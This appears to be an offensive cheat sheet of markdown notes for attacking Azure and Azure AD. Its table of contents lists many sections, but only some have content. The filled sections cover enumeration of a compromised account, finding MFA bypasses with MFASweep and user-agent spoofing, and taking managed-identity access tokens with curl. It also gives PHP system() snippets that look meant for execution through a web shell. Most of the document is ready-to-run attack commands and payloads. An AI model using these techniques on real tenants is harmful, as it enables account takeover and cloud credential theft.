* [General](#General)
* [Exploitation Enumeration](#Exploitation-Enumeration)
  * [When on a new machine](#When-on-a-new-machine)
* [Azure AD](#Azure-AD-Exploitation)
  * [Bypass MFA](#Bypass-MFA)
  * [Managed Identity](#Managed-Identity)
  * [Abusing dynamic groups](#Abusing-dynamic-groups)
  * [Add credentials to enterprise applications](#Add-credentials-to-enterprise-applications)
  * [Break glass accounts](#Break-glass-accounts)
  * [Illicit Consent Grant Phishing](#Illicit-Consent-Grant-Phishing)
  * [Privileged Roles & Privileges](#Privileged-Roles-&-Privileges)
* [Azure Resources Exploitation](#Azure-Resources-Exploitation)
  * [Storage account](#Storage-account)
  * [Keyvault](#Keyvault)
  * [Automation account](#Automation-account)
  * [Command execution on a VM](#Command-execution-on-a-VM)
  * [Deployments](#Deployments)
  * [Arm Templates History](#Arm-Templates-History)
  * [Function apps continuous deployment](#Function-apps-continuous-deployment)
  * [Azure Container Registry dump](#Azure-Container-Registry-dump)
  * [Azure ARC](#Azure-ARC)
  * [Kubernetes](#Kubernetes)
* [Getting credentials](#Getting-credentials)
  * [Stealing tokens](#Stealing-tokens)
  * [Mimikatz](#Mimikatz)
  * [Visual Studio Code](#Visual-Studio-Code)
  * [Publish settings in files](#Publish-settings-in-files)
  * [Storage explorers](#Storage-explorers)
  * [Web config and App config files](#Web-config-and-App-config-files)
  * [Internal repositories](#Internal-repositories)
  * [Command history](#Command-history)
* [Requesting access tokens](#Requesting-access-tokens)

##  General
#### Add a user to a group
- Required aad-graph token
```
Add-AzureADGroupMember -ObjectId <GROUP ID> -RefObjectId <USER ID> -Verbose
```

#### Authenticate with Service Principal / Managed Identity
- Uses cleartext credentials.
```
$password = ConvertTo-SecureString '<SECRET>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('<ACCOUNT ID>', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant <TENANT ID>
```

## Exploitation Enumeration
### When on a new machine
#### Get context of current user
```
az ad signed-in-user show
Get-AzContext
```

#### Get access token
Supported tokens = aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
```
az account get-access-token
az account get-access-token --resource-type ms-graph 
```

#### Check if server has a managed identity
- print environment variables and check for `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` variables exist.
```
env
```

### After getting a new user
#### Check for other tenants
- Login to the Azure portal and in the right top click on the user and then `Switch Directory`.
```
Get-AzTenant
```

#### List all accessible resources
- Or login in https://portal.azure.com and click all resources
```
Get-AzResource

az resource list
```

#### List all owned objects
```
az ad signed-in-user list-owned-objects

Get-AzureADUserOwnedObject -ObjectId <ID>
```

#### Check permissions on the resource
```
Get-AzRoleAssignment -Scope <RESOURCE ID>

az role assignment list
```

##### Get current Azure role assignments
```
Get-AzRoleAssignment
```

#### Get the role definition
```
Get-AzRoleDefinition -Id <ROLEDEFINITION ID>
```

#### Check if it can read any deployment
```
Get-AzResourceGroupDeployment -ResourceGroupName <RESOURCEGROUP>
```

#### Get the allowed actions on the role definition
```
Get-AzRoleDefinition -Name "<ROLE DEFINITION NAME>"
```

## Azure AD Exploitation
## Bypass MFA
### Find Conditional Access bypasses
- Use MFASweep to find inconsistensies through MFA requirements
- https://github.com/dafthack/MFASweep
- Blogpost: https://www.blackhillsinfosec.com/exploiting-mfa-inconsistencies-on-microsoft-services/
```
Import-Module MFASweep.ps1
Invoke-MFASweep -Username <EMAIL> -Password <PASSWORD>
```

#### Change User Agent
- With developer tools or proxy
- Or example: https://addons.mozilla.org/en-US/firefox/addon/custom-user-agent-revived/

#### Edge
- Open Developer tools with `F12`. Press `CTRL + SHIFT + M`.
- Click on `Dimension: Responsive` and select `Edit`. Click `Add custom device...`
- Add the desired name and user agent string and dimension. Example:

```
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15 Edg/100.0.4896.127
Dimensions: 1200x1200
```

## Managed Identity
#### Check if server has a managed identity
- print environment variables and check for `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` variables exist.
```
env
```

#### Request access token(s) for managed identity
- See [Requesting access tokens](#Requesting-access-tokens)

#### Use access tokens to connect with AZ Module
- Account ID can be found in `Client_ID` value from requesting the tokens.
```
$mgmtToken = <TOKEN>
$graphToken = <TOKEN>
Connect-AzAccount -AccessToken $mgmtToken -GraphAccessToken $graphToken -AccountId <ID>
```

#### Use the AZ module to exploit the permissions this managed identity may have!
- Example: Check for resources it can access
- See [Exploitation Enumeration](#Exploitation Enumeration)
```
Get-AzResource
```






## Azure Resourcec Exploitation















## Requesting access tokens
### Curl
#### ARM
```
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

#### Azure AD Graph
```
curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

#### Microsoft Graph
```
curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

#### Keyvault
```
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```

### PHP
#### ARM
```
<?php
  system ('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>
```

#### Azure AD Graph
```
<?php
  system ('curl "$IDENTITY_ENDPOINT?resource=https://graph.windows.net/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>
```

#### Microsoft Graph
```
<?php
  system ('curl "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>
```

#### Keyvault
```
<?php
  system ('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');
?>
```
